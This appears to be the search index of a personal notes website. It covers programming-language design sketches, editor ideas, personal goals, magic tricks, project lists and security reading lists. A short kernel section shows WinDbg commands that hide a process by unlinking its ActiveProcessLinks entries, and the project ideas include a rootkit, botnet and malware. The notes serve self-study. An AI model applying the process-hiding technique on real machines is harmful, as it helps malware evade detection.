this\nstruct Point (x: i32, y: i32);\nlet mut p = Point(x: 1, y: 2);\np.x = 5; // allowed\np.y = 5; // allowed\nlet p = Point(x: 1, y: 2);\np.x = 5; // not allowed\np.y = 5; // not allowed\n\n//===\n// shadowing\n//===\n// allowing shadowing in same scope may have some problems\nfn a(x: i32) {\n  // shadowing is nice for sanitizing\n  let x = if x &lt; 0 { -x } else { x };\n\n  // but others may expect that x is what is passed in. especially if you work\n  // at end of a long function\n\n  // ... use x expecting it to be the input x\n}\n\n// not allowing shadowing will have worse problems\nlet state = getstate();\nlet state2 = processstate(state);\nlet state3 = reprocessstate(state2);\nusestate(state2) // bugprone\n\n// this can be solved with shadowing\n\n// both can be solved by having mutability of type and variable\nlet state = getstate();\nlet state = processstate(state); // error\n\nmut state = getstate(); // state value is constant, but i can reassign the\n                        // variable\nmut state = mut processstate(state); // valid. i can reassign and change state\n// don't like it\n</code></pre>"},{"location":"inbox/compiler/#idea-capitalization-of-types","title":"(idea) capitalization of types","text":"<p>this way you know if you are dealing with a type or a variable at scanning time</p>"},{"location":"inbox/compiler/#language","title":"language","text":"<pre><code>// you specify module before the code in the module. allows you to\n// move the file around without breaking the code\nmodule somemodule\n\n// for now, you can only define one module per file\n// but idea is to allow multiple modules in a file like this. if we want it\n// // this code is part of module somemodule\n// module somemodule::a\n// // this code is part of somemodule::a\n\n// you may only define a module once\n\n// empty module is the current project module, so\n// use ::b\n// is the b module in current project, but\n// use b\n// is the a project's default module\n\n// expression-based language. everything is an expression. block evaluates to\n// the value of the last expression\nfn add(a: i32, b: i32) { a + b }\n\n// available types are:\n// primitives: i32, f32, bool, char...\ntype Int = i32;;\n\n// structures\ntype Point = (x: i32, y: i32);;\n// you create a struct like this\nlet point: Point = Point(x: 1, y: 2)\n// you can skip the field names if you pass variable with same name as field\nlet point: Point = Point(x, y)\n// you have the unit struct\ntype Unit = ();;\n// single values are also structs. you can skip the field name with them\ntype Int = (i: i32);; // same as Int = i32 and Int = (i32)\n// single field structs can be created with just the value\nlet i: Int = 5\nlet j: Int = Int(5)\nlet k: Int = Int(i: 5)\n\n// optionals.\ntype OptInt = Int?;;\nlet opt: OptInt = 5\n// you can skip the value to create a null optional\nlet noInt: OptInt\n// you can check if an optional is null and the compiler will allow you to\n// access the value (type flow analysis)\nif opt { opt } else { 2 } // 5\nif noInt { noInt } else { 2 } // 2\n// they allow pointers to be null\ntype NullableIntPtr = Int\\*?;;\n\n// pointers. they are not nullable. if you move the value, the type becomes\n// IntPtr? (nullable) with value null. that means, they are like c++ unique_ptr\ntype IntPtr = Int\\*;;\n\n// functions\ntype Succ = i32 -&gt; i32;;\n// you can create a function like this (lambda notation)\nlet succ: Succ = ||x: i32 { x + 1 }\n// they only take exactly one argument. to pass multiple, use a struct\ntype Add = (a: i32, b: i32) -&gt; i32;;\nlet add: Add = (a: i32, b: i32) -&gt; { a + b }\n// to pass no arguments, or return nothing, use the unit struct\ntype NoArgs = () -&gt; ();;\nlet no_args: NoArgs = () -&gt; { () }\n// you call functions like this\nsucc 5 // equivalent to succ(5)\nadd(1, 2)\nno_args()\n\n// function receivers. you can define a function that will allow you to call it\n// as a member\nlet Int::add = ||(i, a: int) { i + a }\nlet Point::x = ||(i) { i.x }\n// i is a special parameter name that binds the A structure so you can call add\n// as a member. it must be the first parameter and must not have a type\nlet num: Int = 5\nnum.add(5) // -&gt; 10\n// fuck can still not access private members of A (unless part of same module)\n\n// + is a special function name. you must pass exactly two arguments and return\n// exactly one\n// the two arguments and return types must match\nfn +(a: i32, b: i32) -&gt; i32 {\na.add(b)\n}\n// similar for other operators\n</code></pre>"},{"location":"inbox/compiler/#docs","title":"docs","text":"<ul> <li> <p>invariant based programming with assert and assume</p> </li> <li> <p>encoding invariants into the type system</p> </li> <li> <p>bytecode interpreter and runtime analysis</p> <ul> <li> <p>performance it analyzes the program and finds likely if path, hot code, ... can detect where memory flow and can transform rc to manual</p> </li> <li> <p>safety  can detect every place a specific variable gets assigned  detects memory errors (dbl free, ...)</p> </li> <li>gc    only used in self-ref structures, otherwise rc</li> </ul> </li> </ul>"},{"location":"inbox/compiler/#docsite-ideas","title":"docsite ideas","text":"<p>optional sidebars for additional stuff. something like detail hiding here.</p> <p>docs should be written like this</p> <pre><code>hey there\nhere is some text that is shown in all cases\n\n&gt;!theory\n&gt; here is some text that is shown only when\n&gt; theory mode is enabled\n\n&gt;!history\n&gt; historical notes. why it was done this way, which languages/language features\n&gt; inspired it, and link to initial discussion about this feature\n\n&gt;!imperative\n&gt; how it's done in other languages. i.e. mode for beginners coming from c++\n\n&gt;!implementation\n&gt; implementation details for this specific feature\n\n&gt;!example\n&gt; this is where examples should go. if people are looking for something\n&gt; specific, examples may get in the way. they should be shown by default\n</code></pre> <p>the user should be able to enable or disable these modes at the top by the title</p>"},{"location":"inbox/compiler/#choosing-the-right-idea-matters","title":"choosing the right idea matters","text":"<p>naming things matters because it gives the right abstraction for reader</p> <p>this means even if I provide the same idea with different syntaxes it will affect the readability of programs</p>"},{"location":"inbox/compiler/#name-types-not-values","title":"name types not values","text":"<pre><code>// bad\nlet env: string value map\n\n// good\ntype Env = string value map\nlet env: Env\n</code></pre> <p>idea: values from types</p> <pre><code>let env'\n// equal to\nlet env: Env\n</code></pre>"},{"location":"inbox/data%20hoarding/","title":"data hoarding","text":""},{"location":"inbox/editor/","title":"editor ideas","text":""},{"location":"inbox/editor/#generic-and-modular","title":"generic and modular","text":"<p>there should be 2 default configurations: vscode-like (mouse first) and vim-like (keyboard first) and they should be provided as plugins (to be able to create new. e.g. helix, emacs, ...)</p> <p>plugins should be a core feature and easy to create and share (maybe a lua or lisp api)</p> <p>plugins can depend on other plugins</p>"},{"location":"inbox/editor/#multiple-frontends","title":"multiple frontends","text":"<p>editor is just a server. you can access it from web, terminal, gui, ..., all with same session allowing also for collaborative editing. that also means split configuration for server/frontend</p>"},{"location":"inbox/editor/#speed","title":"speed","text":"<p>should be able to handle big files</p>"},{"location":"inbox/editor/#treesitter-plugin","title":"treesitter plugin","text":"<p>leverage existing tree-sitter parsers</p>"},{"location":"inbox/editor/#per-filetype-configuration","title":"per-filetype configuration","text":"<p>and there may be inline languages (e.g. js in html, code blocks in markdown)</p>"},{"location":"inbox/editor/#good-defaults","title":"good defaults","text":"<p>should be usable out of the box. that means a lot of opt-out plugins.</p> <p>allow configuration to be switched while running</p>"},{"location":"inbox/editor/#features","title":"features","text":""},{"location":"inbox/editor/#folds","title":"folds","text":""},{"location":"inbox/editor/#view-only-modes","title":"view-only modes","text":"<p>e.g. log files, presentations,</p>"},{"location":"inbox/engineering-a-compiler/","title":"engineering a compiler","text":"<p>compiler translates a program from one language to another. it should strive to: - preserve the meaning of the input program. - discernably improve the input program</p> <p>ahead of time compiler - translate before running</p> <p>just in time compiler - translate while running</p> <p>!q same as interpreter?</p>"},{"location":"inbox/exploit%206%20days%20a%20week/","title":"Exploit 6 days a week","text":"<p>6 days of programming. 1 day to learn about others per week</p>"},{"location":"inbox/goals%20-%20long-term/","title":"long term goals","text":"<p>ultimate goal is maximizing net personal happiness. this document outlines goals i have that I believe will help achieve that goal with reasons</p> <p>ideally, all of my time should get me closer to one of the goals</p>"},{"location":"inbox/goals%20-%20long-term/#be-a-great-climber","title":"be a great climber","text":"<p>be able to climb all routes in my gym in a couple of tries (1 day). win amateur competitions</p>"},{"location":"inbox/goals%20-%20long-term/#what-i-need-to-do-to-achieve-this","title":"what i need to do to achieve this","text":"<ul> <li>climb consistently (at least 3 times a week)</li> <li>lose weight</li> <li>get stronger</li> <li>finger strength</li> <li>fitness</li> <li>improve technique</li> <li>improve flexibility</li> <li>learn exercise science, nutrition and sleep</li> </ul>"},{"location":"inbox/goals%20-%20long-term/#make-a-lot-of","title":"make a lot of $$$","text":"<p>financial independence. that is, having enough money invested to be able to live entirely off market returns. currently that is around 4mil\u20ac. that was estimated based on 2% average return (low), a comfortable lifestyle (80k a year) and assumption that I will not work after achieving (which is not planned)</p> <p>== get a better job</p>"},{"location":"inbox/goals%20-%20long-term/#what-i-need-to-do-to-achieve-this_1","title":"what i need to do to achieve this","text":"<ul> <li>figure out what job I want</li> <li>i like consulting type jobs</li> <li>learn new skills relevant to the job I want</li> <li>finish college and get a masters</li> <li>improve networking</li> <li>communication<ul> <li>manipulation and social-engineering</li> <li>psychology</li> <li>body-language</li> <li>negotiation</li> <li>mentalism</li> </ul> </li> <li>appearance</li> <li>do side projects to show off my skills and get experience</li> <li>might make some money with them, but that's not the priority</li> <li>certifications</li> <li>move to a place with better job opportunities</li> </ul>"},{"location":"inbox/goals%20-%20short-term/","title":"goals","text":"<p>be bored (dopamine recalibration) refs: 1</p> <p>scanning personality. think i am, but don't want to be. i want to master something.</p>"},{"location":"inbox/goals%20-%20short-term/#thinking","title":"thinking","text":"<ul> <li>critical thinking</li> <li>psychological biases<ul> <li>priming</li> </ul> </li> <li>logical fallacies</li> <li>dealing with failure</li> <li>5 elements of effective thinking</li> <li>creativity</li> <li>lateral thinking</li> <li>brainstorming</li> <li>mind-mapping</li> <li>meditation and mindfulness</li> <li>emotional intelligence</li> <li>self-awareness</li> <li>reflection</li> <li>self-control</li> <li>self-motivation (personal goals, avoiding procrastination)</li> <li>stress?</li> <li>time management</li> <li>memory</li> <li>observation</li> <li>journaling</li> <li>learning and study</li> <li>note-taking</li> <li>know stuff (enciclopedic. trivia)</li> <li>learn new languages</li> <li>learn social sciences - art, history, literature, philosophy, politics, ...</li> <li>mnemonics</li> </ul>"},{"location":"inbox/goals%20-%20short-term/#communication","title":"communication","text":"<ul> <li>non-verbal communication</li> <li>foreign languages</li> <li>negotiation and persuasion</li> <li>debate and argumentation</li> <li>interviewing</li> <li>social-engineering</li> <li>manipulation</li> <li>doublespeak</li> <li>writing</li> <li>expository (journalism, tutorials)</li> <li>persuasive (cv, proposals)</li> <li>critical (reviews, analysis)</li> <li> <ul> <li>public speaking and presentation</li> </ul> </li> <li>improv</li> <li>cold reading</li> <li>leadership</li> <li>planning and organization</li> <li>marketing</li> <li>strategic thinking</li> <li>management</li> <li>networking</li> </ul>"},{"location":"inbox/goals%20-%20short-term/#technology","title":"technology","text":"<ul> <li>compilers/languages</li> <li>algorithms and data structures/competitive programming</li> <li>distributed systems</li> <li>databases</li> <li>networking</li> <li>operating systems</li> <li>graphics</li> <li>high-performance computing &amp; async. gpu, simd</li> <li>nixos</li> <li>math</li> <li>combinatorics</li> <li>security</li> <li>fuzzing</li> <li>source code analysis/auditing</li> <li>binary analysis</li> <li>reverse engineering</li> <li>linux kernel and kernel exploitation</li> </ul>"},{"location":"inbox/goals%20-%20short-term/#sports","title":"sports","text":"<ul> <li>nutrition</li> <li>nootropics</li> <li>exercise</li> <li>sleep</li> <li>lucid dreaming</li> </ul>"},{"location":"inbox/goals%20-%20short-term/#references","title":"references","text":""},{"location":"inbox/goals%20and%20habits%20-%20smart/","title":"smart goals and habits","text":"<p>resonate with buffet's 20 slots. go \"all in\" on a single skill/goal. for me, that will be programming</p> <p>4 * 90 minute slots per day for deliberate practice</p>"},{"location":"inbox/goals%20and%20habits%20-%20smart/#smart-goals","title":"smart goals","text":"<p>specific, measurable, achievable, relevant, time-bound</p> <p>finish \"crafting interpreters\" book and have a working interpreter by 2024-08-31</p> <ul> <li>start: 2024-07-28</li> <li>it's about .7 chapters per day, so it's achievable</li> <li>planned min 1 time slot per day</li> <li>finish with a blog post</li> </ul> <p>do 2 codeforces problems with rating 2000 in a 90 minute slot consistently (multiple times in a row) by 2024-08-31</p> <ul> <li>start: 2024-07-28</li> <li>hard to say if it's achievable. depends on how fast i can improve</li> <li>planned min 1 time slot per day + 1 problem outside slots if slot is study only</li> </ul> <p>complete 4 intermediate projects with rust by 2024-08-31</p> <ul> <li>start: 2024-07-28</li> <li>1 project every week with some buffer</li> <li>min 1 time slot per day</li> </ul>"},{"location":"inbox/goals%20and%20habits%20-%20smart/#habits","title":"habits","text":"<ul> <li>read either a research paper or 20 pages of a book every day before bed</li> <li>4 deliberate practice sessions of 90 minutes every day</li> <li>meditate 15 minutes every day</li> <li>defocus periods</li> <li>work on side projects every day</li> <li> <p>physiological sigh 5 minutes every day to reduce stress</p> </li> <li> <p>cyclic hyperventilation to temporarily increase focus and alertness</p> </li> </ul> <p>idea: remind yourself of the goals multiple times a day to keep them in mind goals-above-all-else</p>"},{"location":"inbox/goals%20and%20habits%20-%20smart/#deliberate-practice","title":"deliberate practice","text":"<ul> <li>identify the expert performers in your field</li> <li>figure out what they do that makes them so good</li> <li>find out what do you need to improve to achieve those goals</li> <li> <p>design purposeful practice around learning how to do that yourself   set duration</p> </li> <li> <p>work expands to fill the time available for its completion (parkinsons law)</p> </li> </ul>"},{"location":"inbox/goals%20and%20habits%20-%20smart/#references","title":"references","text":""},{"location":"inbox/life%20book/","title":"Life book","text":"<p>i want to write a book. thing is, i'm shit at writing, so the idea is, that for the next couple decades, i'm gathering ideas, fleshing out the story, backstory... and when i'm like 50, i'd start learning humanities and over the rest of my life, i'd write a series of novels in the style of lotr</p>"},{"location":"inbox/magic/","title":"magic","text":""},{"location":"inbox/magic/#waterfall-any-position-kostya-kimlat","title":"waterfall any position (kostya kimlat)","text":"<ul> <li>you have a memorized deck</li> <li>spectator thinks of a card</li> <li>you waterfall and grab the exact card</li> </ul>"},{"location":"inbox/magic/#coin-toss-control","title":"coin toss control","text":"<ul> <li>ability to control a coin toss</li> </ul>"},{"location":"inbox/magic/#unambitious-card","title":"unambitious card","text":"<p>spectator picks a card and places it on the table face up. I get pissed cuz the deck is all the same card, but he chose the one that's different (ruining the trick). I throw the card away \"let's try this again\". picks a card face up. this time the back is different (same trick). \"you're obviously a set up\"...</p> <p>trick ends by having the spectator name a random card. open top card (not the one), open another (again, no). reveal is that all the cards are in new deck order with the one card missing. \"shit. i must've thrown it away. fuck this\" leaves</p>"},{"location":"inbox/projects/","title":"projects","text":""},{"location":"inbox/projects/#ideas","title":"ideas","text":""},{"location":"inbox/projects/#brainstorming","title":"brainstorming","text":"<ul> <li>classification learning for rss feed</li> <li>rss reader app</li> <li>srr: combined -arr's with channels</li> <li>mms (media management system)</li> <li>newsletter to rss (mail server)</li> <li>quality book sharing platform through ipfs   there's a central \"library\" that for each book has \"files\" (each pdf is it's own   file). it also has associated \"features\" (good toc, scan or distributed...)</li> <li>wiki blog platform with repl support. jupyter-like with multiple languages</li> <li>text-based mind map generator</li> <li>torrent files sorter/importer into audiobookbay/jellyfin</li> <li>messaging app based on ssh. have a private/public key pair. nickname on a   server points to a public key. a user is referenced same as in ssh (user@host)</li> <li>minecraft client from scratch (from opengl) - game engine   should implement the original minecraft protocol and be able to connect to servers</li> <li>memory tutorial website</li> <li>game where you can rotate the world with scroll (and yet it moves, but in 3d)</li> </ul>"},{"location":"inbox/projects/#general","title":"general","text":"<ul> <li>terminal db viewer (like dbeaver)</li> <li>chess engine</li> <li>system driver</li> <li>game with engine</li> <li>game from scratch</li> <li>custom game engine</li> <li>raytracer (raytracing-book)</li> <li>spreadsheet</li> <li>emulator</li> <li>decompiler</li> <li>debugger</li> <li>rootkit (sample-rootkit)</li> <li>botnet</li> <li>game cheat - driver, reverse engineering</li> <li>malware - driver, payload, c2</li> <li>operating system</li> <li>search engine</li> <li>web engine</li> <li>text editor</li> <li>hexdump tool</li> <li>lsp server</li> <li>binary file format parser (see: readelf)</li> <li>tcp/ip stack</li> <li>sftp or ssh server</li> <li>packet capture software (like tcpdump or wireshark)</li> <li>tor client</li> <li>irc client/server</li> <li>solve all project-euler problems</li> <li>virtual machine</li> <li>new shell language</li> <li>regex engine - re-&gt;dfa (fuck fa)</li> </ul>"},{"location":"inbox/projects/#references","title":"references","text":""},{"location":"inbox/state%20obvious%20ideas/","title":"State obvious ideas","text":"<p>it's still important to state obvious ideas. it allows you to think about and generalise them allowing for new ideas to arise</p>"},{"location":"inbox/tasks/","title":"tasks","text":"<ul> <li>figure out plymouth</li> <li>fix lock screen gtk styling</li> <li>dotx-shell notification indicator</li> <li>dotx-shell vpn</li> <li>dotx gtk theming theme</li> </ul>"},{"location":"inbox/papers/","title":"reading list","text":"<p>keyword: white paper, research paper, seminal paper</p>"},{"location":"inbox/papers/#computer-science","title":"computer science","text":""},{"location":"inbox/papers/#collections","title":"collections","text":"<ul> <li>vx-underground   malware papers</li> <li>paperswelove</li> <li>awesome scalability</li> <li>list of important publications in computer science</li> <li>cat-v   seems to be unix oriented</li> <li>Ideas That Created the Future (book)   collection of classic papers in computer science</li> <li> <p>Eric S. Raymond's Home Page   a ton about hacking culture and linux</p> </li> <li> <p>cracking-textfiles   from discord: Like it or not, RE had a lot of base in the warez/cracking scene   in the beggining. Here are some textfiles written by bbs/scene mebers on how   to reverse engineer</p> </li> <li>programming-textfiles</li> </ul>"},{"location":"inbox/papers/#fuzzing","title":"fuzzing","text":"<p>https://github.com/0xricksanchez/paper_collection https://github.com/wcventure/FuzzingPaper</p>"},{"location":"inbox/papers/#papers","title":"papers","text":"<ul> <li>a mathematical theory of communication</li> <li>communication in the presence of noise</li> <li>Entscheidungsproblem paper   turing's paper on computation   the annotated turing   (book) for explanation of the paper without math/cs prerequisites</li> <li>go to statement considered harmful</li> <li> <p>structured programming with go to statements   apparently Knuth's response to the above paper \"go to statements considered harmful\"</p> </li> <li> <p>malloc des-maleficarum   reccomendation from day0sec blog</p> </li> </ul>"},{"location":"inbox/papers/thompson%20-%20reflections%20on%20trusting%20trust/","title":"Thompson   reflections on trusting trust","text":""},{"location":"inbox/papers/thompson%20-%20reflections%20on%20trusting%20trust/#reflections-on-trusting-trust-ken-thompson-src","title":"reflections on trusting trust - Ken Thompson: src","text":"<p>paper establishes, that no system that you did not fully create yourself can be trusted. it gives an example of a compiler, that works normally, but when it encounters the program \"login\", it will miscompile it so that it allows a hardcoded password. if you were to inspect the source and remove the miscompilation, it can also miscompile itself to reinsert the bug. no amount of source code verification fully protects you from bad actors. same concept can be applied to any program handling program (assembler, linker or even cpu microcode)</p>"},{"location":"inbox/papers/thompson%20-%20reflections%20on%20trusting%20trust/#thoughts","title":"thoughts","text":"<p>seems to be more applicable then ever with assertions that Intel ME has backdoors</p>"},{"location":"inbox/papers/thompson%20-%20reflections%20on%20trusting%20trust/#rating-0","title":"rating: 0","text":"<p>have to start somewhere. it's interesting, short and doesn't require any prerequisites</p>"},{"location":"kernel/","title":"Windows","text":""},{"location":"kernel/#projects","title":"Projects","text":"<p>spectre rootkit</p> <p>https://github.com/hfiref0x/TDL</p> <p>https://github.com/Mattiwatti/EfiGuard</p> <p>hevd</p> <p>equ8-poc</p> <p>dse overrider</p>"},{"location":"kernel/#posts","title":"Posts","text":"<p>ghost hook</p> <p>https://www.cyberark.com/resources/threat-research-blog/fantastic-rootkits-and-where-to-find-them-part-1</p> <p>irp hooking</p> <p>ssdt hooking</p> <p>bypassing patchguard</p> <p>finding bugs in windows drivers</p> <p>smep</p> <p>https://blog.nviso.eu/?s=kernel+karnage</p> <p>https://codemachine.com/articles/kernel_structures.html#EPROCESS</p> <p>https://www.cyberark.com/resources/threat-research-blog/finding-bugs-in-windows-drivers-part-1-wdm</p> <p>https://web.archive.org/web/20200510110201/https://fullpwnops.com/windows-exploitation-pathway.html</p> <p>https://github.com/SecWiki/windows-kernel-exploits</p> <p>https://github.com/r3p3r/nixawk-awesome-windows-exploitation</p> <p>https://github.com/leesh3288/WinPwn</p> <p>https://github.com/FULLSHADE/WindowsExploitationResources</p> <p>https://github.com/ExpLife0011/awesome-windows-kernel-security-development#qt</p> <p>https://web.archive.org/web/20171116123128/https://malwaretips.com/threads/av-self-protection-process-c-c.66200/</p> <p>https://web.archive.org/web/20221216053118/https://www.x86matthew.com/view_post?id=import_dll_injection</p> <p>https://www.geoffchappell.com/studies/windows/km/index.htm</p> <p>https://github.com/Octoberfest7/Mutants_Sessions_Self-Deletion</p> <p>attacking active directory</p>"},{"location":"kernel/#awesome","title":"Awesome","text":"<p>links</p>"},{"location":"kernel/#lol","title":"LoL","text":"<p>https://www.varonis.com/blog/living-of-the-land-lol-with-microsoft-tools-part-i-intro-to-regsvr</p> <p>https://www.ired.team/offensive-security/code-execution</p> <p>lolbas</p>"},{"location":"kernel/notes/","title":"Linux kernel notes","text":"<p>refs: learningjourney</p>"},{"location":"kernel/notes/#syscalls","title":"Syscalls","text":"<p>refs: s0</p>"},{"location":"kernel/notes/#int-0x80iret-legacy-syscalls","title":"<code>int 0x80</code>/iret (legacy syscalls)","text":"<p>linux needs 32-bit emulation parameter CONFIG_IA32_EMULATION it's a slow path to execute a system call. syscall and sysenter should be preferred unless not available.</p>"},{"location":"kernel/notes/#sysentersysexit","title":"sysenter/sysexit","text":"<p>you should always use __kernel_vsyscall (vdso) to call sysenter as the convention is likely to change.</p> <p>kernel must write msr (segment selector, instruction pointer, stack pointer) to specify how sysenter works.</p>"},{"location":"kernel/notes/#syscallsysret","title":"syscall/sysret","text":"<p>syscall loads rip from LSTAR msr register.</p>"},{"location":"kernel/notes/#virtual-dynamic-shared-object-vdso","title":"virtual dynamic shared object (VDSO)","text":"<p>special memory area that is mapped into the address space of a user-space process at a fixed address. It is used to reduce the cost of making system calls. libc searches for the VDSO and uses it to make system calls if present. VDSO allows for vsyscalls, which are \"system calls\" that run in user space. examples are <code>gettimeofday</code> and <code>getpid</code>. these are faster than traditional system calls because they don't require a context switch.</p>"},{"location":"kernel/notes/#uefi","title":"uefi","text":"<p>refs: osdev/uefi</p>"},{"location":"kernel/virtualization/","title":"Virtualization","text":"<p>https://github.com/tandasat/Hypervisor-101-in-Rust</p>"},{"location":"kernel/debugging/","title":"Debugging","text":""},{"location":"kernel/debugging/qemu-vm-windows-kernel-debugging/","title":"qemu vm windows kernel debugging","text":"<p>add <code>&lt;vendor_id state=\"on\" value=\"KVMKVMKVM\"/&gt;</code> to hyperv block of virt-manager xml (see link) in target vm (host doesn't need this)</p> <p>copy kdnet.exe and VerifiedNICList.xml (not 100% sure if needed) from host (C:\\Program Files (x86)\\Windows Kits\\10\\Debuggers\\x64) to target (c:\\KDNET)</p> <p>make sure host and target can ping each other</p> <p>open ps as admin and run <code>.\\kdnet.exe</code> to make sure your nic is supported.</p> <p>run <code>.\\kdnet.exe &lt;host ip&gt; &lt;port&gt;</code> (recommended port range is 50000-50039). it will print a key</p> <p>open windbg on host and open kernel debugging. enter the port you selected and the key and connect.</p> <p>restart target <code>shutdown -r -t 0</code></p> <p>enjoy the fact you didn't spend 5+h to troubleshoot the connection. (hopefully)</p>"},{"location":"kernel/debugging/qemu-vm-windows-kernel-debugging/#source-debugging","title":"source debugging","text":"<pre><code>0: kd&gt; .symfix // windows debugging symbols\n0: kd&gt; .sympath+ &lt;c:\\path\\to\\project&gt;\n0: kd&gt; .reload /f\n0: kd&gt; ed nt!Kd_Default_Mask 0xf // get debugging messages\n</code></pre>"},{"location":"kernel/debugging/qemu-vm-windows-kernel-debugging/#resources","title":"resources","text":"<p>msdn kdnet</p> <p>windows debugging on qemu</p> <p>msdn source debugging</p>"},{"location":"malware/","title":"Red Team","text":""},{"location":"malware/#sites","title":"Sites","text":"<p>vsociety</p> <p>vx-underground</p>"},{"location":"malware/#forums","title":"Forums","text":"<p>UnKnoWnCheaTs</p> <p>0x00sec</p> <p>houseofhackers</p>"},{"location":"malware/#mailing-lists","title":"Mailing lists...","text":"<p>full disclosure</p> <p>ossec</p> <p>packet storm</p> <p>tmpout zine</p> <p>pentester land writeups</p>"},{"location":"malware/#blogs","title":"Blogs","text":"<p>Bill Demirkapi</p> <p>connor mcgarr</p> <p>danis minimus</p> <p>GodEye club</p> <p>0xpat</p> <p>sektor7</p> <p>sec team</p> <p>inside out security</p> <p>r0da</p> <p>infosecwriteups</p> <p>Andrey Konovalov (linux and android kernel)</p> <p>guitmz</p> <p>xcellerator</p> <p>modexp</p>"},{"location":"malware/#awesome","title":"Awesome","text":"<p>awesome malware development</p> <p>mal/exp resources</p> <p>awesome red teaming</p> <p>vulnerable apps</p>"},{"location":"malware/#cheat-sheets","title":"Cheat sheets","text":"<p>ired.team</p> <p>redteam cheat sheet</p> <p>win32 offensive</p> <p>windows process injection methods</p> <p>threathunter-playbook</p> <p>otterhacker</p> <p>mindmap</p>"},{"location":"malware/#courses","title":"Courses","text":"<p>binary deobfuscation</p> <p>hypervisor-from-scratch</p>"},{"location":"malware/#projects","title":"Projects","text":"<p>cyber attack simulation</p> <p>sysinformer</p> <p>reactos (os reimplementation of win server 2003)</p> <p>LordNoteworthy/al-khaser (collection of malware techniques)</p>"},{"location":"malware/#malware-source","title":"Malware Source","text":"<p>threatland/TL-TROJAN</p>"},{"location":"malware/#cve-db","title":"CVE DB","text":"<p>exploit-db</p> <p>cvedetails</p> <p>nist nvd</p> <p>cve.org</p>"},{"location":"malware/#homeless","title":"Homeless","text":"<p>https://p.ost2.fyi/</p> <p>https://www.airs.com/blog/archives/38</p> <p>https://anti-debug.checkpoint.com/</p> <p>https://pages.cs.wisc.edu/\\~remzi/OSTEP/</p> <p>https://www.codeproject.com/Articles/1273844/The-Intel-Assembly-Manual-3</p> <p>zerosum</p> <p>uninformed</p> <p>paged out</p> <p>valhala</p> <p>poc||gtfo</p> <p>secret.club</p> <p>linode docs</p> <p>https://kwcsec.gitbook.io/the-red-team-handbook/</p> <p>http://redplait.blogspot.com/</p> <p>https://github.com/bluscreenofjeff/Red-Team-Infrastructure-Wiki</p> <p>https://github.com/BishopFox/sliver</p> <p>https://github.com/samratashok/nishang</p> <p>https://github.com/rmusser01/Infosec_Reference</p> <p>https://github.com/Trusted-AI/adversarial-robustness-toolbox</p> <p>https://github.com/bluscreenofjeff/Red-Team-Infrastructure-Wiki</p> <p>https://github.com/SofianeHamlaoui/Lockdoor-Framework</p> <p>https://chris124567.github.io/2021-06-23-survey-obfuscation/</p> <p>https://www.msreverseengineering.com/research</p> <p>https://otterhacker.github.io/Malware/CoffLoader.html</p> <p>https://googleprojectzero.github.io/0days-in-the-wild/rca.html</p> <p>https://www.crowdstrike.com/blog/state-of-exploit-development-part-1/</p> <p>https://github.blog/tag/github-security-lab/</p> <p>https://www.sei.cmu.edu/publications/technical-papers/index.cfm</p>"},{"location":"malware/linux/","title":"Linux","text":"<p>https://linux-kernel-labs.github.io/refs/heads/master/lectures/intro.html</p> <p>https://github.com/hygoni/awesome-linux-kernel</p> <p>https://github.com/rynsy/awesome-kernel</p> <p>http://www.dit.upm.es/\\~jmseyas/linux/kernel/hackers-docs.html</p> <p>https://codemachine.com/articles/interrupt_dispatching.html</p> <p>https://github.com/tkmru/awesome-linux-rootkits</p> <p>https://xairy.io/articles/syzkaller-external-network</p> <p>https://github.com/xairy/linux-kernel-exploitation</p>"},{"location":"malware/linux/#privesc","title":"Privesc","text":"<p>GTFOBins (when you have sudo/suid binary)</p>"},{"location":"malware/kernel/dkom/","title":"DKOM","text":""},{"location":"malware/kernel/dkom/hiding-processes/","title":"Hiding processes","text":"<p>the process list is a doubly linked list data structure, which means that each entry has pointers to the previous and the next process in the list. every process in the system has an _EPROCESS structure associated with it that stores data about the process.</p> <pre><code>0: kd&gt; !process 0 0 notepad.exe\nPROCESS ffffa3848e707080\n...\n</code></pre> <p>the links for the previous and next process are contained within the ActiveProcessLinks member of the _EPROCESS structure.</p> <pre><code>0: kd&gt; dt _EPROCESS ffffa3848e707080\nnt!_EPROCESS\n   +0x000 Pcb              : _KPROCESS\n   +0x438 ProcessLock      : _EX_PUSH_LOCK\n   +0x440 UniqueProcessId  : 0x00000000`00000e80 Void\n   +0x448 ActiveProcessLinks : _LIST_ENTRY [ 0xfffff807`3661df60 - 0xffffa384`8e7054c8 ]\n   ...\n</code></pre> <pre><code>0: kd&gt; dt _LIST_ENTRY (ffffa3848e707080 + 448)\nnt!_LIST_ENTRY\n [ 0xfffff807`3661df60 - 0xffffa384`8e7054c8 ]\n   +0x000 Flink            : 0xfffff807`3661df60 _LIST_ENTRY [ 0xffffa384`89a98488 - 0xffffa384`8e7074c8 ]\n   +0x008 Blink            : 0xffffa384`8e7054c8 _LIST_ENTRY [ 0xffffa384`8e7074c8 - 0xffffa384`8e7064c8 ]\n</code></pre> <p>to remove a process from this list, we need to change the previous process' Flink to point to next process and the next process' Blink to point to previous process. pseudo-code would look somethng like this</p> <pre><code>Flink-&gt;Blink = Blink\nBlink-&gt;Flink = Flink\n</code></pre> <p>let's do that.</p> <pre><code>0: kd&gt; eq (0xfffff807`3661df60 + 8) 0xffffa384`8e7054c8\n0: kd&gt; eq 0xffffa384`8e7054c8 0xfffff807`3661df60\n</code></pre> <p>that's it. if we now open task manager, we see that notepad.exe isn't in the process list.</p> <p>no notepad.exe in task manager</p>"},{"location":"malware/kernel/dkom/hiding-processes/#code","title":"Code","text":""},{"location":"malware/kernel/dkom/hiding-processes/#resources","title":"Resources","text":"<p>CodeMachine: _EPROCESS structure explained</p>"},{"location":"math/","title":"Math","text":""},{"location":"math/#resources","title":"Resources","text":"<ul> <li>combinatorics-roadmap</li> </ul>"},{"location":"ml/","title":"Machine Learning","text":""},{"location":"ml/#research","title":"research","text":"<p>paperswithcode</p>"},{"location":"ml/#courses-and-books","title":"courses and books","text":"<p>d2l</p> <p>deep learning specialization</p> <p>practical deep learning for coders</p> <p>kaggle learn</p>"},{"location":"ml/#awesome","title":"awesome","text":"<p>start-machine-learning</p>"},{"location":"ml/#machine-learning-in-depth-examples","title":"machine learning in depth examples","text":"<p>iris dataset</p> <p>spaceship titanic</p>"},{"location":"ml/#nlp","title":"nlp","text":"<p>prompting course</p> <p>transformers study guide</p> <p>roadmap to master nlp</p>"},{"location":"ml/#rl","title":"rl","text":"<p>coursera specialization</p> <p>intro to rl</p> <p>deepmind learning resources</p> <p>spinning up in rl by openai</p> <p>awesome deep 